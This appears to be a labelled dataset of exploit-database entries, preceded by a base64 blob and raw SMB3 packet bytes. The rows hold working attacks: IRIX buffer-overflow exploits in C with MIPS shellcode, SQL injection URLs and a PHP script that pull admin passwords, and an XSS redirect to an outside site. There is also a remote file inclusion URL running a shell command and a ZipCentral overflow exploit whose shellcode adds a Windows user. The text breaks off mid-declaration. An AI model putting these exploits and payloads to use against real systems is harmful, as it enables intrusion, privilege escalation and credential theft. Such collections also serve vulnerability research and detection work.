o0qjflfyRGeFEnFbJrG/m/FawTW35AVy4Dzyj+eJQPeQjNUDpmYCF7lQg8Ogvik53rxqvui98DhvKhF+4MoEBubL1+5KYhpWaLpZZh1wWRApn+DTiwV1KUjfLu72oMxXE2QbWRVJnVua7bDgTPYhkmcikzMbN4yGprXifkhtG1YJQnbIzblIXvXkPez9NxuREL6UK/g++yirnXG0ivqUHmwdaCboKGdBaNW0Qoy+xzoysSqMYq5uPGw/LKEDibnGbGnMHLOjt453tpH5xMl97NonJR/BBOFhBoHkThU1/YHixszHzACzvczNaqlQdhjI+Q8WP0Kx8jt9BU0U3sxfTAmCeXYmxqp/uqbTXyzLuEeBVEQC+q+hJQIMH8S3pvjY4qziXxmKoxQJCp9NNfEPvrWQ2f5JF48rhgfAgfEBi9S+/TVTxxXrieIKawGSCbkmKBoAwY4WdzTcDYx4g//iNrX1QAaaoDf8vb9ATdjaHfqzNP9gurzND8sPwoq+ycAIaNYJiETdZI0B2Q+hKiGeDLdEO1saWq9h01RJDy/P9mlctezmygnbBrGg7c96cIg+6bdk1qzWg+4pL4TiW3oItBPL479EawjdSdG0ylAzArCpsQOKbLinzREtN4WvASRp630H2BfNIlTzTWOJgr31eRv2xeirFjtwqpcu5ALyz3Juw6ewjc7IGZ1a1D5hn82L2KejU4OnLaNrMFiGieF4C53LX7MZvVeUkxUg6qp+hCSfUIVUJUwgsHZrsz/fYuPWX1WzLJE9xN0mkiX53rb/c5+IzbStPqEtOiFSND6P1ud65kV4Gmp4WqeVftdcHAvBQCq44EmmKxWurmNEEojdq8jxZ7XRHVWtwu7DbGIiRbwmx82L4PeX3XIcLYMqqLBHpOO/vkaj2SMq93y4bWP9yrepQQ9pgralkGcVWBOlqZ6muD6zMY8kChC9NW9mzBRoUa4D8xlVjMpiqXlNggBIydZLt7KE5Nqcel/qY6hEc7FHT3+bPjHVKO5yCYF8R1Mun5ixLcdXS3NghRRf9qC3nr8XLuyVS/+ktxQYZlz0k48pfLrspxguOJkJER3GZcDT0B0rJHHIwqdx1VQVA3OUsbNBdNz0ReDlKIZt8kTDlk4mO8+YM9Uz2l6uV8QPCTDtYZZeaJCDxlQx+sXE2ZgAQEr6neprH8ycAIb64J3C5ZI0yFkLDbN2U+BkPA8otv1dADGEqxI1TtkOY/LcyNddDhyAW9gm4qf3MQyzclmKXbk8uEb3ZKFRmhGAUi+SFtzvnF6DZ5XCgpICgfBlIsU7SW6nO6yrRnOR6WKty1jMySkvyEUBr97g3YOgzTsp0vOZBz1mFpD0qJ7jOSjyWD5q+/HB7bJFC25fBV/a4+bp5dMa6s9wjOF9LUt1VPCd6mGZ1IxZQV94kzBmdbNoQNotIBUcyLOO3mtEyKHMarLQ7IdL3+6QPjrtZ676JFF6Fhco3kcwxLi7tEokjkrjiuxTJ7VOLMMoSqihIRgpTXkEvW4yy3O1fgQ+bAb0PNcCPaSxznfpGq9Rcq8uTkCgqDKEBujpjKKYi4BHd\\x00\\x00\\x105\\xffSMB3\\x00\\x00\\x00\\x00\\x18\\x07\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00__TREEID__PLACEHOLDER__\\xff\\xfe__USERID__PLACEHOLDER__@\\x00\\t\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x105\\x00\\xd0#\\x00\\x00\\x00\\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\\x00\\x00\\x105\\xffSMB3\\x00\\x00\\x00\\x00\\x18\\x07\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00__TREEID__PLACEHOLDER__\\xff\\xfe__USERID__PLACEHOLDER__@\\x00\\t\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x105\\x00\\xd03\\x00\\x00\\x00\\x10GCYPv9lQlkfTV1+aTMUTA0VfaLFyhZq68nTvu6n4pfUV30t9T3TFceGCIx4zTnCQ6S5EjjToosWCxmsltoACAot76+pWFnqcM81lhzddyobk6y7FHmjg68R4aFhZxnGaWE98CXh+wNXxpVQrRWuXsT/exO9Fgq3iJa9YrhsWDVrNddlLhlPZSjd+r7Vb1N42DLbI3TsRC6QTWTCW/u9CZP5OtTLfF5RtGJpRD1w7ATC3MGMEx3ecXVNTq93wT9UOpAdiYhTfRbbGSc3CQYjiZAQeP8+9l+vBMXIVPix9JjXoMpMMNALmtmyPcDktAfCRTNLvWW7/Yr/ZO80z7zqvqhJEEdffn8QkT9e5IWcMjcgV3Gglscqoh41iMXn7hUxI2bGaD2DPEQvGkIM1b/vVlcwQZ5hgqlHRLOCDWdMiIPJOyikWBpc0XExEycIbYGOOlrO1qmrdigNdT1yDJQK0Iv0NrdhqHw2+YH85NqAoCiWHU9cXoGYyaYsAy2tz1FEVsu6ci4R/YbYYSf6bOJo/jNWi/2Cpy6YkwJLe5+AMfbY2EaKnFOiMNs9lrNFzpwbfa7F+K9HYIis1Xtz0A4vXrvJashxkwrYVcchVKnccoXc5Q0mj2emCkx7YyU+DWEhpL705osvQUIkjXM4bmBD/8t5Fa2ByIChQeolaJJ3sDLApsbVoDd+8ZbRGl4964iBIMaHFxSapRYrdlwk29AS3LXPiJBFdQQZXwCOROaz7PZfs086Nt3A8Zq8FKpL6/ALGQDfNi2GdixRe8LNkFWt8ZIy8kzuf9uR6sUivF8FZKwniB9XioG9S0Oe0fHmIG8vPISlcD5hQlRVhnbHFybZAECaqzV97MMKdCi1oIys9aUz7r4H1AqrHiS/FXMyd/EP21A6cM3zGjxyktGoQx0hV3sYvthjyIwQAcUKpgmL+VETTLp8QV8kqV2rrzpqzHgbmgFThT13t6mHf9ELtg8wovtONtS0VBsTCaMSSpDwo5Jo7OayvdM0ZgmSJF3q+QK0avgLv/4CGSWX5CdAY5bVOmiK3URqJGG6MCpTC5MBP8V6IrNOldfEQVMiQQBV0YOvd9UJG/o2DBKOdevpotJOuju2dkTBfStGf0T9V2v763rEQ2Fr8OVR7cGy9e26kP6k1WZJ3F4nBoZc3Oyzavsxmq1paVdYOaRvd0zdjXBCkXrw0oR2vL6QapaV0X7+OBw/jxeTZaj0+joCVdFY5a7G3sJGbn43UA2bwLMyAJSw/LvYI1T7LYM30eQPcikfYEIz63QNgc9c3JX5OEh8sCWMAJlduF/JTWsj4fTSH/aJQDkv0ZJr8cgFe+62RiZI0whnXF1AhBkdoOGbaxwA8BeHxaDX296Z0Tqg8BZXLyw1jS7ZhANKqYFjG/XIT1/pQsPSRS+0CVhiGUu0JPvA6MIy0a6U/E5efdOIadmMs3s2PjxAbyZ6cPh/Ep9RUTZ9z/0ptYl5+tHUwu5z7BEIoB/DKvkutUu2xW6fEClrZY+rdrFD5KQbp0qhYwgEls4ay1j31a+xkRP6TTMx8VvXUutIg1Gmd7i+sXAS6mY98lKee9NvMpJE7OavgZJbxo/kqwdZ5Tj1l7eearPZpscRjg4CUfNauUXzGWhrG2FiNPItH0FOQ7A9f3cPXnSmM0ThoXpQbOQk+0Qw0Ma8AvBS9wk1Xim39g+qnsR0jH1hj+GnpLnT2V696xoLq5JXvFCldRwwZ18",,
,,0,
334,"SGI IRIX - 'LsD' Multiple Local Buffer Overflows /* copyright by */ /* Last Stage of Delirium, Dec 1996, Poland*/  #include <stdio.h> #include <stdlib.h> #include <fcntl.h>  #define BUFSIZE 2068 #define OFFS 800 #define ADDRS 3 #define ALIGN 0 #define ALIGN2 4  char asmcode[]=""\x3c\x18\x2f\x62\x37\x18\x69\x6e\x3c\x19\x2f\x73\x37\x39\x68\x2e\xaf\xb8\xff\xf8\xaf\xb9\xff\xfc\xa3\xa0\xff\xff\x27\xa4\xff\xf8\x27\xa5\xff\xf0\x01\x60\x30\x24\xaf\xa4\xff\xf0\xaf\xa0\xff\xf4\x24\x02\x04\x23\x02\x04\x8d\x0c""; char nop[]=""\x24\x0f\x12\x34"";  void run(unsigned char *buf) {   execl(""/usr/sbin/eject"",""lsd"",buf,NULL);   printf(""execl failed\n""); }  char jump[]=""\x03\xa0\x10\x25\x03\xe0\x00\x08\x24\x0f\x12\x34\x24\x0f\x12\x34"";  main(int argc, char *argv[]) {   char *buf, *ptr, addr[8];   int offs=OFFS, bufsize=BUFSIZE, addrs=ADDRS, align=ALIGN;   int i, noplen=strlen(nop);    if (argc >1) bufsize=atoi(argv[1]);   if (argc >2) offs=atoi(argv[2]);   if (argc >3) addrs=atoi(argv[3]);   if (argc >4) align=atoi(argv[4]);    if (bufsize<strlen(asmcode)) {     printf(""bufsize too small, code is %d bytes long\n"", strlen(asmcode));     exit(1);   }   if ((buf=malloc(bufsize+(ADDRS<<2)+noplen+1))==NULL) {     printf(""Can't malloc\n"");     exit(1);   }    *(int *)addr=(*(unsigned long(*)())jump)()+offs;   printf(""address=%p\n"",*(int *)addr);    strcpy(buf,nop);   ptr=buf+noplen;   buf+=4-align;   for(i=0;i<bufsize;i++)    *ptr++=nop[i%noplen];   memcpy(ptr-strlen(asmcode),asmcode,strlen(asmcode));   for(i=0;i<(addrs<<2);i++)    *ptr++=addr[i%sizeof(int)];   *ptr=0;    printf(""buflen=%d\n"", strlen(buf));   fflush(stdout);    ptr-=addrs<<2;   *(int *)addr+=(0x7fff350c-0x7fff31e8)+(4*100)+ALIGN2;   for(i=0;i<64;i++)    *ptr++=addr[i&3];   /* gp value is set here */   ptr=buf+ALIGN+(0x7fff2f00-0x7fff2ce8)-24;   *(int *)addr=(*(unsigned long(*)())jump)()+OFFS+(0x7fff350c-0x7fff31e8-4)+ALIGN2+32+32412;    for(i=0;i<64;i++)    *ptr++=addr[i&3];    run(buf); }  ------------------------------------------------------------------------------------ /* copyright by */ /* Last Stage of Delirium, Dec 1996, Poland*/  #include <stdio.h> #include <stdlib.h> #include <fcntl.h>  #define BUFSIZE 2072 #define OFFS (800+512+128) #define ADDRS 0x100 #define ALIGN 2  char asmcode[]=""\x3c\x18\x2f\x62\x37\x18\x69\x6e\x3c\x19\x2f\x73\x37\x39\x68\x2e\xaf\xb8\xff\xf8\xaf\xb9\xff\xfc\xa3\xa0\xff\xff\x27\xa4\xff\xf8\x27\xa5\xff\xf0\x01\x60\x30\x24\xaf\xa4\xff\xf0\xaf\xa0\xff\xf4\x24\x02\x04\x23\x02\x04\x8d\x0c""; char nop[]=""\x24\x0f\x12\x34"";  void run(unsigned char *buf) {   execl(""/usr/bin/X11/xlock"",""lsd"",""-name"",buf,NULL);   printf(""execl failed\n""); }  char jump[]=""\x03\xa0\x10\x25\x03\xe0\x00\x08\x24\x0f\x12\x34\x24\x0f\x12\x34"";  main(int argc, char *argv[]) {   char *buf, *ptr, addr[8];   int offs=OFFS, bufsize=BUFSIZE, addrs=ADDRS, align=ALIGN;   int i, noplen=strlen(nop);    if (argc >1) bufsize=atoi(argv[1]);   if (argc >2) offs=atoi(argv[2]);   if (argc >3) addrs=atoi(argv[3]);   if (argc >4) align=atoi(argv[4]);    if (bufsize<strlen(asmcode)) {     printf(""bufsize too small, code is %d bytes long\n"", strlen(asmcode));     exit(1);   }   if ((buf=malloc(bufsize+(ADDRS<<2)+noplen+1))==NULL) {     printf(""Can't malloc\n"");     exit(1);   }    *(int *)addr=(*(unsigned long(*)())jump)()+offs;   printf(""address=%p\n"",*(int *)addr);    strcpy(buf,nop);   ptr=buf+noplen;   buf+=4-align;   for(i=0;i<bufsize;i++)    *ptr++=nop[i%noplen];   memcpy(ptr-strlen(asmcode),asmcode,strlen(asmcode));   for(i=0;i<(addrs<<2);i++)    *ptr++=addr[i%sizeof(int)];   *ptr=0;    printf(""buflen=%d\n"",strlen(buf));   fflush(stdout);  /* gp value is set here */   ptr=buf+ALIGN+(0x7fff22c0-0x7fff1ea0);   *(int *)addr=(*(unsigned long(*)())jump)()+OFFS+(0x7fff3828-0x7fff3468)+32476;   for(i=0;i<4;i++)    *ptr++=addr[i&3];    run(buf); }  ------------------------------------------------------------------------------------ /* copyright by */ /* Last Stage of Delirium, Dec 1996, Poland*/  /* This one gives you egid=0(sys) */  #include <stdio.h> #include <stdlib.h> #include <fcntl.h>  #define BUFSIZE 4172 #define OFFS 816 #define ADDRS 8 #define ALIGN 3 #define ALIGN2 1  char asmcode[]=""\x3c\x18\x2f\x62\x37\x18\x69\x6e\x3c\x19\x2f\x73\x37\x39\x68\x2e\xaf\xb8\xff\xf8\xaf\xb9\xff\xfc\xa3\xa0\xff\xff\x27\xa4\xff\xf8\x27\xa5\xff\xf0\x01\x60\x30\x24\xaf\xa4\xff\xf0\xaf\xa0\xff\xf4\x24\x02\x04\x23\x02\x04\x8d\x0c""; /* char nop[]=""\x24\x0f\x12\x34""; */ char nop[]=""\x01\x20\x48\x25"";  void run(unsigned char *buf) {   execl(""/sbin/pset"",""lsd"",""-s"",""666"",buf,NULL);   printf(""execl failed\n""); }  char jump[]=""\x03\xa0\x10\x25\x03\xe0\x00\x08\x24\x0f\x12\x34\x24\x0f\x12\x34"";  /* unsigned long get_sp(void) { __asm__(""or     $2,$sp,$0""); } */ main(int argc, char *argv[]) {   char *buf, *ptr, addr[8];   int offs=OFFS, bufsize=BUFSIZE, addrs=ADDRS, align=ALIGN;   int i, noplen=strlen(nop);    if (argc >1) bufsize=atoi(argv[1]);   if (argc >2) offs=atoi(argv[2]);   if (argc >3) addrs=atoi(argv[3]);   if (argc >4) align=atoi(argv[4]);    if (bufsize<strlen(asmcode)) {     printf(""bufsize too small, code is %d bytes long\n"", strlen(asmcode));     exit(1);   }   if ((buf=malloc(bufsize+(ADDRS<<2)+noplen+1))==NULL) {     printf(""Can't malloc\n"");     exit(1);   }    *(int *)addr=(*(unsigned long(*)())jump)()+offs;   printf(""address=%p\n"", *(int *)addr);    strcpy(buf,nop);   ptr=buf+noplen;   buf+=align;   for(i=0;i<bufsize;i++)    *ptr++=nop[i%noplen];   memcpy(ptr-strlen(asmcode),asmcode,strlen(asmcode));   for(i=0;i<ALIGN2;i++)    *ptr++=nop[i%noplen];   for(i=0;i<(addrs<<2);i++)    *ptr++=addr[i%sizeof(int)];   *ptr=0;   printf(""buflen=%d\n"", strlen(buf));   fflush(stdout);    run(buf); }  // milw0rm.com [1997-05-25]","[""'LsD'""]",1
30947,"NetBizCity FaqMasterFlexPlus - 'faq.php' SQL Injection source: https://www.securityfocus.com/bid/27052/info  FaqMasterFlexPlus is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  All versions of FaqMasterFlexPlus are considered vulnerable.  http://www.example.com/[path/to/faq]/faq.php?category_id=1'%20union%20select%201,1,user(),1/* http://www.example.com/[path/to/faq]/faq.php?category_id=1'%20union%20select%201,1,passwrd,1%20from%20users%20where%20userid='admin","[""'faq.php'""]",1
37944,vBSEO - 'u' Cross-Site Scripting source: https://www.securityfocus.com/bid/55908/info  vBSEO is prone to a cross-site scripting vulnerability because it fails to sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  vBSEO 3.8.7 is vulnerable; other versions may also be affected.   http://www.example.com/forums/member.php?tab=friends&u=11411%22%3E%3Cscript%3Ewindow.location%20=%20%22http://www.internot.info/forum/%22%20%3C/script%3E  http://www.example.com/forum/member.php?u=1%22%3E%3Cscript%3Ewindow.location%20=%20%22http://www.internot.info/forum/%22%20%3C/script%3E,"[""'u'""]",0
2378,"GNUTURK 2G - 't_id' SQL Injection <? /* ------------------------------------------------------------------------------------------------------------ --------Gnu turk all versions simple get admin uname & pass without hash blind sql injection exploit---------------                              -------------Powered by p2y ---------------                     ---------------Use it at ur own RisK :P :D ---------------------- ------------------------------------------------------------------------------------------------------------     p2y@p2y:~/Desktop/projects$ php gnuturk.php 127.0.0.1 /portals/gnuturk/ 1  -------------------------------- Powered by p2y Admin username : p2y Admin password : sanane N0w go 2 http://127.0.0.1/portals/gnuturk/admin/ and login with this inf0rmation Cuz n0where is Secure En0ugh ... --------------------------------   */ //simple get admin username && pass exploit by p2y error_reporting(0); $site=$argv[1]; $path=$argv[2]; $id=$argv[3];  if($site && $path && $id) { if(!ereg(""http"",$site)) $site=""http://"".$site;  $sql=""mods.php?go=Forum&p=vtop&t_id=-2%20Union/**/Select/**/1,2,username,password,5,6,7,8,9/**/From/**/gtp_admins/**/WHERE/**/id=$id/*""; $url=$site.$path.$sql;  $html=file_get_contents($url); $tmp=explode(""/*>"",$html); $rtmp=explode(""</a>"",$tmp[1]); $a_username=$rtmp[0];    $tmp=explode('<td class=""forum_msg"" valign=""top"">',$html); $rtmp=explode(""</td>"",$tmp[1]); $a_pass=$rtmp[0];    echo ""--------------------------------\n""; echo ""Powered by p2y\n""; echo ""Admin username : $a_username\n""; echo ""Admin password : $a_pass\n""; echo ""N0w go 2 $site$path"".""admin/ and login with this inf0rmation\n""; echo ""Cuz n0where is Secure En0ugh ...\n""; echo ""--------------------------------\n"";    } else {  echo ""--------------------------------\n""; echo ""Powered by p2y\n""; echo ""Enter host path admin id\n""; echo ""usage = php p2y.php 127.0.0.1 /gnu/ 1\n""; echo ""Cuz n0where is Secure En0ugh ...\n""; echo ""--------------------------------\n"";   }  ?>  # milw0rm.com [2006-09-16]","[""'t_id'""]",1
27786,phpBB Knowledge Base 2.0.2 - 'Mod KB_constants.php' Remote File Inclusion source: https://www.securityfocus.com/bid/17763/info  Knowledge Base Mod for phpbb is prone to a remote file-include vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  This issue is reported to affect version 2.0.2 and prior; other versions may also be vulnerable.  http://www.example.com/includes/kb_constants.php?module_root_path=http://www.example.com/cmd.gif?cmd=ls,"[""'Mod KB_constants.php'""]",1
2278,"ZipCentral 4.01 - '.ZIP' File Handling Local Buffer Overflow /* ZipCentral 4.01 Exploit by bratax (http://www.bratax.be/)  Soooooo many thanks to BuzzDee and c0rrupt for helping me with all the problems I encountered :) Wouldn't have finished this without you guys!  Greetz to everyone I like... (no, that doesn't include you turb00)!  ******************************  Some technical info: - vulnerability is available here:   http://secunia.com/secunia_research/2006-35/advisory - using SEH to exploit this - some code might look weird in this source.. (e.g. shellcode, offsets,...)   this is because a lot of values are changed in memory.. so use your favorite   debugger to see the real values and codes - shellcode adds a windows user ""bck"" with password ""bck"" (thx metasploit) - tested on XP Pro English (SP2) and XP Home Dutch (SP2)  */  #include <stdio.h> #include <string.h>  unsigned char scode[] = ""\x89\x03\x59\x89\x05\x8a\x9b\x98\x98\x98\x4f\x49\x49\x49\x49\x49"" ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"" ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"" ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"" ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"" ""\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x34\x4e\x43\x4b\x48\x4e\x57"" ""\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x58\x4f\x34\x4a\x31\x4b\x58"" ""\x4f\x35\x42\x42\x41\x30\x4b\x4e\x49\x54\x4b\x48\x46\x43\x4b\x58"" ""\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"" ""\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"" ""\x46\x4f\x4b\x43\x46\x45\x46\x32\x46\x50\x45\x47\x45\x4e\x4b\x38"" ""\x4f\x35\x46\x52\x41\x30\x4b\x4e\x48\x56\x4b\x38\x4e\x50\x4b\x44"" ""\x4b\x38\x4f\x55\x4e\x51\x41\x50\x4b\x4e\x4b\x38\x4e\x51\x4b\x58"" ""\x41\x50\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x33"" ""\x42\x4c\x46\x46\x4b\x58\x42\x54\x42\x53\x45\x58\x42\x4c\x4a\x57"" ""\x4e\x50\x4b\x58\x42\x34\x4e\x50\x4b\x58\x42\x57\x4e\x41\x4d\x4a"" ""\x4b\x38\x4a\x36\x4a\x50\x4b\x4e\x49\x30\x4b\x48\x42\x58\x42\x4b"" ""\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x56\x4e\x33\x4f\x35\x41\x33"" ""\x48\x4f\x42\x46\x48\x35\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x57"" ""\x42\x55\x4a\x56\x42\x4f\x4c\x48\x46\x50\x4f\x35\x4a\x46\x4a\x49"" ""\x50\x4f\x4c\x48\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x56\x4d\x56"" ""\x46\x46\x50\x42\x45\x46\x4a\x57\x45\x56\x42\x52\x4f\x42\x43\x36"" ""\x42\x52\x50\x46\x45\x56\x46\x57\x42\x52\x45\x57\x43\x47\x45\x36"" ""\x44\x47\x42\x42\x44\x46\x43\x56\x4b\x36\x42\x42\x44\x56\x43\x56"" ""\x4b\x46\x42\x52\x4f\x42\x41\x34\x46\x44\x46\x34\x42\x32\x48\x42"" ""\x48\x32\x42\x32\x50\x56\x45\x46\x46\x57\x42\x52\x4e\x36\x4f\x36"" ""\x43\x46\x41\x56\x4e\x56\x47\x36\x44\x37\x4f\x46\x45\x37\x42\x37"" ""\x42\x52\x41\x54\x46\x56\x4d\x36\x49\x36\x50\x36\x49\x56\x43\x37"" ""\x46\x57\x44\x47\x41\x56\x46\x37\x4f\x56\x44\x47\x43\x57\x42\x52"" ""\x44\x56\x43\x46\x4b\x46\x42\x32\x4f\x52\x41\x54\x46\x34\x46\x44"" ""\x42\x30\x5a"";  char head[] = 